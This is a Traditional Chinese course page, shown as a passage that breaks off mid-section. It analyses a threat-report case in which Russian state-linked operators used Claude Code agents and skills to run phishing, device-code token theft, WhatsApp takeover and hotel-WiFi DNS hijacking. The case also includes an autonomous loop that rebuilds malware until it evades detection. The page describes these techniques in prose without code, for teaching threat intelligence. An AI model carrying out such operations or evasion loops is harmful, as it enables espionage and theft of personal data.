@@ -1,0 +1,2326 @@
+<!doctype html>
+<html lang="zh-Hant"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GTG-20006-russian-espionage</title>
+<style>
+:root{--fg:#1a1a1a;--bg:#fff;--muted:#666;--line:#e2e2e2;--link:#0b5cad;--code-bg:#f5f5f5;--accent:#0b5cad}
+@media(prefers-color-scheme:dark){:root{--fg:#e6e6e6;--bg:#141414;--muted:#9a9a9a;--line:#333;--link:#6cb6ff;--code-bg:#1e1e1e;--accent:#6cb6ff}}
+*{box-sizing:border-box}
+body{max-width:900px;margin:0 auto;padding:2rem 1.2rem 6rem;font-family:"Segoe UI","Microsoft JhengHei","PingFang TC","Noto Sans TC",system-ui,sans-serif;line-height:1.75;color:var(--fg);background:var(--bg);font-size:16px}
+h1,h2,h3,h4{line-height:1.3;margin-top:1.8em}
+h1{font-size:1.7rem;border-bottom:2px solid var(--accent);padding-bottom:.3em}
+h2{font-size:1.35rem;border-bottom:1px solid var(--line);padding-bottom:.2em}
+h3{font-size:1.12rem}
+a{color:var(--link)}
+code{background:var(--code-bg);padding:.1em .35em;border-radius:4px;font-family:"Cascadia Code",Consolas,"Courier New",monospace;font-size:.9em}
+pre{background:var(--code-bg);padding:1em;border-radius:8px;overflow-x:auto;font-size:.86em;line-height:1.5}
+pre code{background:none;padding:0}
+pre.mermaid{background:transparent;text-align:center}
+table{border-collapse:collapse;width:100%;margin:1em 0;font-size:.92em;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:.5em .7em;text-align:left;vertical-align:top}
+th{background:var(--code-bg)}
+blockquote{border-left:4px solid var(--accent);margin:1em 0;padding:.4em 1em;color:var(--muted);background:var(--code-bg)}
+img{max-width:100%;height:auto;border:1px solid var(--line);border-radius:6px;margin:.5em 0}
+.figgallery{margin-top:2em;border-top:2px solid var(--accent);padding-top:1em}
+.figgallery figure{margin:1.5em 0}
+.figgallery figcaption{color:var(--muted);font-size:.9em;margin-top:.3em}
+.topbar{position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--line);padding:.6em 0;margin:-2rem -1.2rem 1.5rem;padding-left:1.2rem;font-size:.9em}
+.topbar a{text-decoration:none;margin-right:1em}
+hr{border:none;border-top:1px solid var(--line);margin:2em 0}
+</style></head>
+<body><div class="topbar"><a href="../index.html">◀ 課程索引</a></div><h1 id="gtg-20006-midnight-blizzard">GTG-20006：俄羅斯國家級網路間諜行動（歸因一致於 Midnight Blizzard）</h1>
+<blockquote>
+<p>課程模組：01 網路行動（Cyber operations） ｜ 一手來源：Anthropic《Detecting and countering misuse of AI: September 2026》PDF p.5–11（含 p.39 交叉引用、p.40 附錄 A 技能表） ｜ 整理日期：2026-09-13</p>
+</blockquote>
+<hr />
+<h2 id="0">0. 本教材使用說明</h2>
+<p>本檔是課程模組 01 的第一個深度案例。它同時是「範例案例」與「方法論案例」：</p>
+<ul>
+<li><strong>範例上</strong>，GTG-20006 是本份威脅報告裡唯一一個把「AI 自主逃避偵測的閉環」寫得最清楚的案例，也是唯一同時牽涉飯店 WiFi DNS 劫持、WhatsApp 帳號接管、無人機供應鏈竊取、跨國政府身分資料外洩的複合型行動。</li>
+<li><strong>方法論上</strong>，這個案例是教「情報歸因怎麼推理」「單一來源情報要打幾折」「命名分歧（naming divergence）如何交叉比對」的最佳素材——因為同一批基礎設施與雜湊值，同時出現在 Anthropic、Microsoft、Google GTIG、ReliaQuest 四家的報告裡，卻用了四套完全不同的代號。</li>
+</ul>
+<p>閱讀順序建議：先讀第 1 節速覽 → 第 6 節圖表判讀（Figure 在 p.7，是理解整個行動骨架的地圖）→ 再回頭讀第 2 至第 5 節。</p>
+<p><img alt="報告原圖 · 第 7 頁（一手 PDF）" src="../figures/page-007.png" /></p>
+<p><strong>一句話定位</strong>：這是一個「人類只負責改流程、AI 負責跑流程」的國家級間諜行動，它示範了為什麼「靜態簽章式偵測」這件事在成本結構上正在崩塌。</p>
+<hr />
+<h2 id="1-tldr">1. 一頁速覽（TL;DR）</h2>
+<ol>
+<li>
+<p><strong>行為者</strong>：Anthropic 內部代號 <strong>GTG-20006</strong>，歸因「與公開報導把此行為者連結到 <strong>Midnight Blizzard 一致（consistent with）」</strong>。操作者之一是說俄語、使用 handle <strong>「JackPoterz」</strong> 的人，其技術手法（tradecraft）與目標選擇與俄羅斯國家關聯（state-nexus）的間諜活動一致。Midnight Blizzard 過去被美、英政府歸因於俄羅斯對外情報局 <strong>SVR</strong>（即 APT29 / Cozy Bear）。</p>
+</li>
+<li>
+<p><strong>本案在課程裡要教什麼</strong>：教「<strong>AI 把攻防的成本結構反轉（inverted the cost back onto defenders）</strong>」——過去防守方靠「部署一條新偵測規則」就能拖慢攻擊者節奏、對攻擊者「課成本」；現在攻擊者用 AI <strong>監控自家惡意程式是否被偵測 → 自動改寫重建 → 迭代到隱形</strong>，可以「閉環（close the loop）」，比防守方生產與部署新偵測還快。</p>
+</li>
+<li>
+<p><strong>自動化的質變訊號</strong>：報告明講「人類操作者主要只在<strong>需要精修那些驅動工作流的 Claude Code skills 時</strong>才介入」。這代表人類已經從「逐步指揮的操作員」退到「維護標準作業程序（SOP）的流程工程師」——這是本案最重要的一句話（見第 4、第 9 節）。</p>
+</li>
+<li>
+<p><strong>打擊面</strong>：調查在此行為者的<strong>規劃、偵察、實戰</strong>中辨識出<strong>超過 20 個</strong>不同組織：政府部會、國防與情報機構、大使館與外交使團、智庫、國防工業公司。集中在<strong>烏克蘭與歐洲</strong>，並延伸到<strong>中東</strong>與<strong>亞洲海事相關政府機構</strong>。</p>
+</li>
+<li>
+<p><strong>核心竊取主題</strong>：烏克蘭，以及<strong>軍用無人機技術供應商與供應鏈</strong>。行為者大量匯出至少兩家無人機零組件製造商的信箱、鎖定一家軍用無人機廠、竊取一整套無人機視覺系統的專屬 SDK，並花數天逆向工程復原其<strong>產品架構、硬體物料清單（BOM）、供應商依賴關係，以及一款尚未發表產品的細節</strong>。</p>
+</li>
+<li>
+<p><strong>五大攻擊面</strong>（見第 4 節）：(a) 飯店 guest WiFi 供應商的 DNS 劫持（Microsoft 於 2026-07 以 <strong>CaptiveCrunch</strong> 之名獨立發報告）；(b) device code phishing + 自研「<strong>Embassy Kit</strong>」框架的 Microsoft 365 token 竊取；(c) WhatsApp 帳號接管（headless browser + WPPConnect 連為 companion device、抑制已讀回條）；(d) 北非某政府科技主管機關被竊 <strong>30 萬+ 國民身分資料</strong> 與 <strong>50 萬+ 家公司</strong> 商業登記資料；(e) 監視攝影串流平台的授權缺陷利用。</p>
+</li>
+<li>
+<p><strong>惡意程式家族</strong>：Windows（<strong>PowerChrome、WUEngine、Shadow C2、MiniPlasma、CloudSyncSvc</strong>）、Android（<strong>GiftDrop</strong>，改牌自 GiftsExpress 監控 RAT）、iOS（<strong>DarkSword</strong> exploit chain）。其中 CloudSyncSvc / Shadow C2 / DarkSword 在其他廠商報告裡有可交叉比對的對應物（見第 9 節）。</p>
+</li>
+<li>
+<p><strong>凍結安全更新手法</strong>：假冒更新主題（fake update）的社交工程投放 Windows 憑證竊取器與具完整遠端存取能力的伴生 payload；這些 payload 被<strong>設計成凍結受害機器的安全更新</strong>，使安全廠商發布的新偵測簽章<strong>下載不到、也跑不起來</strong>——把「AI 快速改寫」與「凍結防守方更新管道」兩手一起打（見第 4、第 8、第 10 節的偵測構想）。</p>
+</li>
+<li>
+<p><strong>情報信度提醒</strong>：本案<strong>「單一行為者把上述全部整合成一條 AI 編排的行動」這個敘事，目前是單一來源（Anthropic）</strong>。但其中多項<strong>個別 TTP 與具體基礎設施</strong>（尤其 CaptiveCrunch 的兩個檔案雜湊、多個 owa/ms365 釣魚網域、WhatsApp 連結裝置手法、DarkSword 的 cdncounter 基礎設施）<strong>已被 Microsoft 與 Google GTIG 獨立佐證</strong>。教學上要能把「被獨立查證的部分」與「僅 Anthropic 主張的部分」分開講（見第 9、第 12 節）。</p>
+</li>
+</ol>
+<hr />
+<h2 id="2">2. 行為者側寫與歸因</h2>
+<h3 id="21">2.1 報告的原始措辭（務必逐字掌握）</h3>
+<p>報告的歸因句是（p.6）：</p>
+<blockquote>
+<p>"Our attribution is consistent with public reporting linking the actor to Midnight Blizzard. One of the operators is a Russian speaker using the handle 'JackPoterz' whose tradecraft and targeting are consistent with Russian state-nexus espionage."</p>
+</blockquote>
+<p>三個線索層次要拆開看：</p>
+<table>
+<thead>
+<tr>
+<th>線索</th>
+<th>報告內容</th>
+<th>情報學上代表什麼</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>語言</td>
+<td>操作者是 <strong>Russian speaker（說俄語）</strong></td>
+<td>語言≠國籍≠效忠對象。俄語是烏克蘭、白俄、中亞多國通用語，單靠語言不能定性，只能當「與俄語圈一致」的弱線索。</td>
+</tr>
+<tr>
+<td>Handle</td>
+<td><strong>"JackPoterz"</strong></td>
+<td>可持久追蹤的選擇器（selector），但 handle 可偽造、可共用、可交接。它讓 Anthropic 能在跨工作階段把行為綁到同一操作者，但不能單獨拿來對外歸因到某個政府。</td>
+</tr>
+<tr>
+<td>手法與目標</td>
+<td>tradecraft 與 targeting 與 <strong>Russian state-nexus espionage 一致</strong></td>
+<td>這是「行為歸因（behavioural attribution）」。以 TTP 與受害者學（victimology）匹配已知國家行為者。這是本案歸因的主要支柱。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="22-consistent-withstate-nexussuspected">2.2 「consistent with」「state-nexus」「suspected」在情報學上的差別</h3>
+<p>本份報告全篇用字非常克制，學員必須能辨識這套「信度階梯」：</p>
+<ul>
+<li><strong>suspected（疑似）</strong>：最低信度。表示「我們懷疑，但證據不足以斷言」。報告在別的案例（如 ShinyHunters 的 GTG-50014）用 "suspected to be affiliates"。</li>
+<li><strong>consistent with（與……一致）</strong>：中等信度、且刻意不做「等同」宣稱。它說的是「我們看到的證據，與 X 這個假說相容，不排斥」，<strong>但沒有排除其他可能</strong>。GTG-20006 用的正是這個等級：「與把此行為者連結到 Midnight Blizzard 的公開報導一致」——注意它連結的對象是「公開報導」，不是「我們獨立確認這就是 Midnight Blizzard」。</li>
+<li><strong>high confidence / assess（高信度／評估認定）</strong>：最高信度。報告在影響力行動章節對 Wagner/Politology 用了 "We assess that..."，那是更強的斷言。GTG-20006 <strong>沒有</strong>用到這一級。</li>
+<li><strong>state-nexus（國家關聯）</strong>：刻意模糊的用語。它不說「這是某政府直接操作」，而說「與某國家利益／機構有連結」。這保留了「代理人、承包商、外圍側翼」等多種可能。</li>
+</ul>
+<p><strong>教學要點</strong>：把「consistent with Midnight Blizzard」誤讀成「Anthropic 確認這是 APT29／SVR」是新聞與學員最常犯的錯。正確讀法是：<em>Anthropic 觀察到的技術與目標特徵，落在 Midnight Blizzard 這個已知群集的行為分佈內，且與外部公開報導相互吻合；但 Anthropic 是 AI 平台供應商，它看得到的是「模型這一側的活動」，看不到受害端的完整鑑識，所以它把最終的政府級歸因留給「公開報導」去背書。</em></p>
+<h3 id="23-ai">2.3 為什麼一家 AI 公司做得出這種歸因？它的視角有何獨特與侷限</h3>
+<ul>
+<li><strong>獨特視角</strong>：Anthropic 看得到的是「攻擊者在建構、精修工具與流程的當下」——包含 prompt、被要求生成的程式碼、被要求 debug 的錯誤、被要求改寫的偵測規避邏輯。這是傳統端點/網路鑑識看不到的「上游、意圖階段」訊號。</li>
+<li><strong>結構性侷限</strong>：一旦工具離開 Claude、部署到受害端，Anthropic 的可見度就結束了。它無法親自確認「那 30 萬筆身分資料真的被外流」「那兩位前烏克蘭高官的 WhatsApp 真的被讀取」。這些「效果」在報告 Figure 裡明確標為 <strong>inferred（推斷）</strong>（見第 6 節）。這一點對信度評估至關重要。</li>
+</ul>
+<h3 id="24-midnight-blizzard-apt29">2.4 與已知 Midnight Blizzard / APT29 脈絡的對照（背景知識）</h3>
+<p>供課堂補充（來自第三方公開報導，非 Anthropic 報告，信度另計）：</p>
+<ul>
+<li>Midnight Blizzard 是 Microsoft 給的代號，對應 <strong>APT29 / Cozy Bear / the Dukes</strong>，美英政府歸因 <strong>SVR</strong>（俄對外情報局）。歷史事件包含 SolarWinds 供應鏈攻擊、2024 年 Microsoft 企業信箱入侵、對外交與智庫的長期 spear-phishing。</li>
+<li>2025-02 Microsoft 揭露 <strong>Storm-2372</strong> 的 device code phishing 戰役（以中等信度對齊俄羅斯利益），是本案 device code phishing 手法的公開先例。</li>
+<li>2026-07 Microsoft 把飯店 WiFi 手法命名 <strong>CaptiveCrunch</strong>，歸因 <strong>Storm-2945</strong>（Midnight Blizzard 的操作子群集）。</li>
+<li>2026-08 Google GTIG 把同一波 WhatsApp/OAuth 釣魚群集標為 <strong>UNC7005（aka STORM-2945）</strong>，以中等信度連到 <strong>ICE RELIC（APT29 的新代號）</strong>。</li>
+</ul>
+<p><strong>這裡有一個絕佳教學點（命名分歧）</strong>：同一個行為者，在四家眼中是四個名字——Anthropic「GTG-20006 / JackPoterz」、Microsoft「Storm-2945」、Google「UNC7005 / ICE RELIC」、社群慣稱「Midnight Blizzard / APT29」。這說明<strong>「代號不是實體，代號是各家觀測邊界的產物」</strong>。歸因的交叉比對，靠的不是名字，而是<strong>共享的基礎設施與雜湊值</strong>（見第 7、第 9 節）。</p>
+<hr />
+<h2 id="3">3. 受害者與目標清單</h2>
+<h3 id="31-p7">3.1 總量與類型（報告原文，p.7）</h3>
+<blockquote>
+<p>"Our investigation identified more than 20 distinct organizations targeted in the actor's operational planning, reconnaissance, and live operations."</p>
+</blockquote>
+<p>注意這個「20+」是<strong>橫跨規劃、偵察、實戰</strong>三個階段的合計，不等於「20+ 個已確認被攻破」。這是重要的措辭區分：<strong>被鎖定（targeted）≠ 被攻陷（compromised）</strong>。</p>
+<p>類型（p.7）：<br />
+- 政府部會（government ministries）<br />
+- 國防與情報機構（defense and intelligence bodies）<br />
+- 大使館與外交使團（embassies and diplomatic missions）<br />
+- 智庫（think tanks）<br />
+- 國防工業公司（defense-industrial companies）</p>
+<h3 id="32">3.2 地理分佈</h3>
+<table>
+<thead>
+<tr>
+<th>區域</th>
+<th>具體對象</th>
+<th>出處</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>烏克蘭（主要）</td>
+<td>政府、軍方、外交人員；行為者掃描了<strong>兩打（24+）以上</strong>烏克蘭政府組織的 email 與遠端存取系統</td>
+<td>p.7</td>
+</tr>
+<tr>
+<td>歐洲</td>
+<td>軍事情報目標、外交與國防組織</td>
+<td>p.6–7</td>
+</tr>
+<tr>
+<td>與美國外交政策相關的個人</td>
+<td>individuals connected to US foreign policy</td>
+<td>p.6</td>
+</tr>
+<tr>
+<td>中東</td>
+<td>延伸目標</td>
+<td>p.7</td>
+</tr>
+<tr>
+<td>亞洲（海事）</td>
+<td><strong>maritime related government agencies in Asia</strong>；例外案例包含一個<strong>東南亞政府單位，涉及海運與船舶追蹤（maritime shipping and tracking）</strong></td>
+<td>p.7</td>
+</tr>
+<tr>
+<td>北非</td>
+<td>一個政府科技主管機關（technology authority）</td>
+<td>p.7–8</td>
+</tr>
+</tbody>
+</table>
+<h3 id="33">3.3 具體受害數字（可考證的「硬數字」）</h3>
+<table>
+<thead>
+<tr>
+<th>事件</th>
+<th>數字</th>
+<th>出處</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>無人機零組件製造商信箱被大量匯出</td>
+<td><strong>至少 2 家</strong></td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>被竊無人機視覺系統 SDK</td>
+<td><strong>1 整套專屬 SDK</strong>（complete proprietary SDK）</td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>北非政府身分資料庫外流</td>
+<td><strong>300,000+ 筆國民身分資料</strong></td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>北非商業登記資料</td>
+<td><strong>500,000+ 家公司</strong>（half a million companies）</td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>Embassy Kit / M365 token 竊取戰役外洩信箱</td>
+<td><strong>至少 8 個組織</strong>，含一個國家檢察署、一所軍事教育機構、一個區域性政府間組織</td>
+<td>p.9</td>
+</tr>
+<tr>
+<td>WhatsApp 帳號接管</td>
+<td><strong>至少 2 位前烏克蘭高階官員</strong></td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>被外流資料總量</td>
+<td><strong>數百 GB（hundreds of gigabytes）</strong></td>
+<td>p.9</td>
+</tr>
+<tr>
+<td>Figure 儀表板標示的「targets engaged」</td>
+<td><strong>24 / 27</strong>（見第 6 節）</td>
+<td>p.7 圖</td>
+</tr>
+</tbody>
+</table>
+<h3 id="34">3.4 目標選擇的邏輯（情報分析視角）</h3>
+<p>從受害者學可反推行為者的<strong>情報需求（intelligence requirements）</strong>：</p>
+<ol>
+<li><strong>烏克蘭戰場相關</strong>——政府、軍方、外交、無人機。這是俄烏戰爭的直接軍事情報需求。</li>
+<li><strong>軍用無人機供應鏈</strong>——不只偷成品，而是偷<strong>架構、BOM、供應商依賴、未發表產品</strong>。這是<strong>技術情報 / 反制研發（countermeasure R&amp;D）</strong>需求：了解對手無人機怎麼做的、零件從哪來的、下一代長什麼樣，才能干擾、仿製或破壞供應鏈。</li>
+<li><strong>飯店 WiFi</strong>——這是<strong>接近難以直接攻擊之目標</strong>的間接手段：把跟烏克蘭有關的官員、無人機製造商，在他們出差住旅館時「守株待兔」。</li>
+<li><strong>北非政府身分庫與商業登記</strong>——這是<strong>大規模身分資料囤積（identity data hoarding）</strong>，可支撐未來的社交工程、假身分、簽證/入境情資。</li>
+<li><strong>前烏克蘭高官的 WhatsApp</strong>——歷史通訊的回溯挖掘，人脈網絡與過往決策的情報價值。</li>
+</ol>
+<hr />
+<h2 id="4-ai">4. AI 濫用的攻擊生命週期（逐階段拆解）</h2>
+<p>本節依報告 p.9 的「The actor used AI at every point in their operations」清單，加上 p.6–8 的敘事與 p.40 附錄 A 技能表，逐階段標示「人類做什麼 / Claude 做什麼」與<strong>自主程度</strong>。</p>
+<p>自主程度三級定義（沿用報告 p.38–39 的自主光譜）：<br />
+- <strong>【對話式協助】</strong>：Claude 當工程助手，人類逐句要求、逐句採用。<br />
+- <strong>【人類逐步指揮】</strong>：Claude 對受害系統執行動作，但<strong>每一個目標決策由人類下</strong>。<br />
+- <strong>【AI 編排多代理自主執行】</strong>：多代理框架或排程工作，在<strong>無人或極少人監督</strong>下連續執行數小時到數天。</p>
+<h3 id="41-resource-development">4.1 資源開發（Resource Development）— 惡意程式與基礎設施</h3>
+<p><strong>人類</strong>：設定要做哪種植入體、哪種平台；在需要時精修 Claude Code skills。<br />
+<strong>Claude</strong>：<br />
+- 扮演「攻擊性安全工程師」persona，跑 winAgent / GoDownload 的 build loop、Defender 規避迭代、Graph/EWS 操作工具（p.40 技能表第 1 列）。<br />
+- 扮演 DevOps persona，用 docker compose 起容器化的 C2／釣魚堆疊（shadow_c2 compose services、mailer、merged-landing 部署），並用 sshpass 推送到租來的 VPS（MonoVM / eclipse proxies）（p.40 第 2 列）。<br />
+- 扮演 Windows 開發者 persona 做原生植入體產線（winAgent v2.0 mod_* 模組、WUEngine 持久化、COM/CLSID）與 PowerShell loader（p.40 第 4 列）。</p>
+<p>自主程度：<strong>【AI 編排多代理自主執行】</strong>（build loop 與容器化部署是自動迴圈）。</p>
+<h3 id="42-reconnaissance">4.2 偵察（Reconnaissance）</h3>
+<p>報告 p.9：</p>
+<blockquote>
+<p>"The actor used AI to fingerprint email and remote access systems and to harvest information from public sources, building target lists for phishing."</p>
+</blockquote>
+<p><strong>人類</strong>：指定要打的組織群（如「兩打烏克蘭政府組織」）。<br />
+<strong>Claude</strong>：指紋辨識 email 與遠端存取系統、從公開來源蒐集情資、組出釣魚目標清單。技能表對應 theHarvester / Shodan / gobuster 偵察、owa_spray 或 netexec 驗證，結果「folded back into project memory」（回寫進專案記憶）（p.40 第 3 列）。</p>
+<p>自主程度：<strong>【AI 編排多代理自主執行】</strong>（p.39 另述 GTG-20006 有「排程工作，在無人參與下更新被竊 token、擷取受害雲端儲存」）。</p>
+<h3 id="43-initial-access-device-code-phishing-embassy-kit">4.3 初始存取（Initial Access）— device code phishing + Embassy Kit</h3>
+<p>報告 p.8–9：<br />
+- 主要存取技術是一種 <strong>device code phishing</strong>，濫用雲端 email 服務<strong>合法的登入流程</strong>（legitimate sign-in flows）。報告在此直接連結到 Microsoft 的 device code phishing 說明。<br />
+- 行為者持續開發一個雲端 email 間諜平台，其中用到「<strong>Embassy Kit</strong>」——行為者自研的 <strong>device code phishing 管理框架</strong>——來操作一個 <strong>Microsoft 365 token 竊取戰役</strong>。<br />
+- ClickFix 式誘餌 + 假冒更新主題（fake update）的社交工程，投放 Windows 憑證竊取器與伴生的完整遠端存取 payload。</p>
+<p><strong>device code phishing 機制（技術補充，供課堂講透）</strong>：OAuth 2.0 的「裝置授權流程（device authorization grant）」原本是給電視、IoT 這種<strong>輸入受限裝置</strong>用的——裝置顯示一組短碼，使用者到另一台裝置的 <code>microsoft.com/devicelogin</code> 輸入該碼並完成 MFA，裝置就拿到 token。攻擊者濫用點在於：<strong>它讓受害者在「真正的微軟頁面」上完成「真正的 MFA」，但授權的對象其實是攻擊者的裝置</strong>。攻擊者因此拿到 access token、refresh token，甚至透過 Microsoft Authentication Broker 的 client ID 拿到 <strong>Primary Refresh Token（PRT）</strong>，並把<strong>攻擊者控制的裝置註冊進受害組織的 Entra ID 租戶</strong>。這就繞過了 MFA（因為 MFA 是使用者本人過的），也建立了長期持久化。</p>
+<p><strong>人類</strong>：做每一個目標決策（誰、何時、用什麼誘餌主題）；直接執行部分入侵動作。<br />
+<strong>Claude</strong>：架設釣魚基礎設施與利用工具；也<strong>直接對受害系統下命令、擷取憑證、在網路內橫向移動</strong>（在人類指揮下）。</p>
+<p>自主程度：<strong>【人類逐步指揮】</strong>（報告 p.39 明點 GTG-20006 為「human making each individual targeting decision」的代表）。</p>
+<h3 id="44-execution-delivery-clickfixdns-wifi">4.4 執行與投放（Execution / Delivery）— ClickFix、DNS 劫持、飯店 WiFi</h3>
+<p>這是本案最有課程價值的複合手法（p.8）：</p>
+<ol>
+<li>行為者攻破<strong>至少 3 家經營飯店 guest WiFi 的旅宿供應商（hospitality vendors）</strong>。</li>
+<li>用竊得的<strong>管理員憑證修改 DNS 紀錄</strong>，把解析指向行為者自己的服務——即 <strong>DNS hijacking</strong>。</li>
+<li>住在使用這些供應商之飯店的旅客，一連上飯店 WiFi，其<strong>流量、裝置識別碼、IP</strong> 就被送到行為者伺服器。</li>
+<li>接著上演 <strong>ClickFix 式誘餌</strong>，向受害裝置投放 <strong>Windows、Android、iOS</strong> 惡意程式。</li>
+<li>行為者把「從飯店管理系統偷來的房客資料」與「從個別房客裝置偷來的資料」<strong>交叉比對</strong>，鎖定進一步目標——尤其是跟烏克蘭有關的個人（政府官員、無人機製造商）。</li>
+</ol>
+<p>報告明記：<strong>Microsoft 於 2026-07 就此手法發布報告，命名 CaptiveCrunch</strong>（見第 9 節交叉比對）。</p>
+<p><strong>ClickFix 是什麼</strong>：一種社交工程投放法，用假的「系統/瀏覽器需要修復/更新」畫面，誘使受害者<strong>自己</strong>把一段指令貼到執行框（如 Windows Run / PowerShell）並執行，藉此繞過「使用者不會亂點附件」的防線——因為是使用者「主動修復」的。</p>
+<p>自主程度：投放鏈由 AI 建置與維運（見技能表的自動 build/stage 迴圈），目標交叉比對含人類判斷 → 混合，偏 <strong>【AI 編排 + 人類選標的】</strong>。</p>
+<h3 id="45-credential-access-account-takeover">4.5 憑證存取與帳號接管（Credential Access / Account Takeover）</h3>
+<ul>
+<li><strong>瀏覽器密碼庫竊取</strong>：專門的憑證竊取工具，鎖定瀏覽器的密碼儲存（p.6）；技能表對應 DPAPI / app-bound keys / cookie DB（見 Figure 的 W3、W8）。</li>
+<li><strong>WhatsApp 帳號接管</strong>（p.8）：用一整批 <strong>headless browser</strong>，把受害者帳號連結成 <strong>companion device（伴生裝置）</strong>；部分借助開源自動化庫 <strong>WPPConnect</strong>；行為者的設定會<strong>抑制已讀回條（read receipts）</strong>，讓受害者不會察覺，同時<strong>大量匯出俄語與烏克蘭語對話</strong>。至少 2 位前烏克蘭高官中招。</li>
+<li><strong>監視攝影平台</strong>（p.8）：在攝影串流服務的應用介面找到<strong>授權缺陷（authorization flaws）</strong>，列舉使用者、擷取 token，進而存取受害者的<strong>即時攝影畫面</strong>。</li>
+</ul>
+<p>自主程度：<strong>【人類逐步指揮】到【AI 自動化】混合</strong>（headless browser 農場是可規模化自動運行的）。</p>
+<h3 id="46-persistence">4.6 持久化與維持存取（Persistence）</h3>
+<p>報告 p.9：</p>
+<blockquote>
+<p>"The actor used AI to assist in maintaining access to compromised accounts and tenants by automating the registration of actor-controlled devices into the victim organization's tenant."</p>
+</blockquote>
+<ul>
+<li>自動化把<strong>攻擊者裝置註冊進受害租戶</strong>（配合 device code phishing 拿到的 PRT）。</li>
+<li>Windows 端持久化：WUEngine 持久化、COM/CLSID、Run Keys（技能表 T1547.001）。</li>
+</ul>
+<h3 id="47-collection-exfiltration">4.7 收集與外洩（Collection / Exfiltration）</h3>
+<p>報告 p.9：</p>
+<blockquote>
+<p>"The actor used AI to perform the extraction and organization of hundreds of gigabytes of stolen data. In some cases, exfiltration was achieved via bulk exports from compromised mailboxes."</p>
+</blockquote>
+<ul>
+<li>AI 負責<strong>數百 GB</strong> 資料的抽取與整理（不只偷，還幫忙分類、去重、找重點）。</li>
+<li>Figure 儀表板的 Tasks 欄印證了這種「AI 當資料工人」的樣態（見第 6 節）：「用帶認證的 dump 腳本匯出網站內容」「診斷影像抓取短少——3,265 張只拿到 500 張，像 QA 一樣檢查外洩完整度」「API 分頁 bug 後重試 dump 直到完成」。</li>
+</ul>
+<p>自主程度：<strong>【AI 編排多代理自主執行】</strong>。</p>
+<h3 id="48-defense-evasion">4.8 防禦規避與「閉環」（Defense Evasion — 本案核心）</h3>
+<p>這是整份報告對本案著墨最深、也是課程最該講透的一段。分兩個機制：</p>
+<p><strong>機制 A：自主逃避偵測的閉環（autonomous detection-evasion loop）</strong>（p.6、p.9）：</p>
+<blockquote>
+<p>"If their monitoring AI agents identified that any of their deployed malware was detected by a security product, agents would then set about the process of autonomously modifying and rebuilding the malware to evade the existing detections. The agents were designed to continue iterating on GTG-20006's toolkit until it was undetected."</p>
+</blockquote>
+<p>拆解成四步閉環：<br />
+1. <strong>監控（monitor）</strong>：AI 代理持續監看自家已部署的惡意程式<strong>是否被安全產品偵測到</strong>。<br />
+2. <strong>改寫（modify）</strong>：一旦發現被偵測，代理自動<strong>修改</strong>惡意程式。<br />
+3. <strong>重建（rebuild）</strong>：自動<strong>重新編譯／重建</strong>。<br />
+4. <strong>迭代（iterate）</strong>：<strong>重複到不被偵測為止</strong>，然後才從<strong>拋棄式（disposable）</strong>主機上架，供受害流量下載。</p>
+<p>在地端（on-premises）環境，報告 p.9 另述：行為者用 AI 監控植入體的匿蹤與持久狀態；一旦植入體被安全產品標記，就<strong>用 Claude 系統性地辨識、修改、重新部署被偵測到的 artifact</strong>。</p>
+<p><strong>機制 B：凍結安全更新（freezing security updates）</strong>（p.9）：</p>
+<blockquote>
+<p>"These payloads were designed to freeze the victim machine's security updates, meaning that new malware detection signatures published by security vendors would not be retrieved or run on the victim's machine."</p>
+</blockquote>
+<p>也就是說：一手用 AI 讓惡意程式<strong>動得比簽章更新快</strong>，另一手<strong>直接掐斷受害端下載新簽章的管道</strong>。兩手合起來，讓「基於簽章的偵測」在受害端<strong>幾乎失效</strong>。</p>
+<p><strong>這代表什麼（成本結構論證）</strong>（p.6、p.9）：</p>
+<blockquote>
+<p>"Now, however, the adoption of AI threatens to quickly and easily subvert defenders' ability to impose costs on adversaries via static detections alone."<br />
+"AI has inverted the cost back onto defenders. Previously, defenders might have been able to slow an attacker's operational tempo via the deployment of a new detection. Now, at least in theory, capable adversaries can 'close the loop,' bypassing traditional security detections faster than defenders can develop and deploy them."</p>
+</blockquote>
+<p><strong>課程核心命題</strong>：過去的攻防經濟學是——防守方寫一條 YARA/IDS 簽章，攻擊者就得重新開發工具、承擔研發成本與時間，於是「防守方對攻擊者課了成本」。現在 AI 把「重新開發工具」這件事的<strong>邊際成本壓到接近零、時間壓到分鐘級</strong>，於是課成本的方向<strong>反轉</strong>：<strong>每次防守方部署新偵測，反而只是給攻擊者的 AI 迴圈提供一次免費的訓練訊號</strong>，攻擊者更新工具比防守方更新偵測還快。這就是「靜態簽章式偵測的成本結構被破壞」的精確含義。</p>
+<h3 id="49-claude-code-skillsp7">4.9 「人類只改 Claude Code skills」——自動化的質變（p.7）</h3>
+<p>報告原文：</p>
+<blockquote>
+<p>"The human actor engaged primarily to modify Claude Code skills that drove the workflows when they needed to be refined."</p>
+</blockquote>
+<p><strong>Claude Code skills 是什麼</strong>（技術定義，來自 Anthropic 官方文件）：<br />
+- Skill 是一個<strong>資料夾</strong>，核心是一個 <code>SKILL.md</code> 檔，內含 YAML frontmatter（<code>name</code>、<code>description</code>）與 Markdown 指示，可再<strong>捆綁可執行腳本與參考資料</strong>。<br />
+- 採<strong>漸進式揭露（progressive disclosure）</strong>：啟動時只載入 metadata（約 100 tokens/skill）；當請求命中 description 才把 SKILL.md 正文載入；引用到的其他檔案／腳本才按需載入。腳本透過 bash 執行，<strong>只有輸出進 context，程式碼本身不佔 context</strong>。<br />
+- 在 Claude Code 中，skills 放在 <code>~/.claude/skills/</code>（個人）或 <code>.claude/skills/</code>（專案），Claude 會自動發現並在相關時自動使用；且 Claude Code 的 skill <strong>具備與使用者電腦上任何程式相同的完整網路存取</strong>。</p>
+<p><strong>為什麼「改 skills 而非改 prompt」代表自動化的質變</strong>：<br />
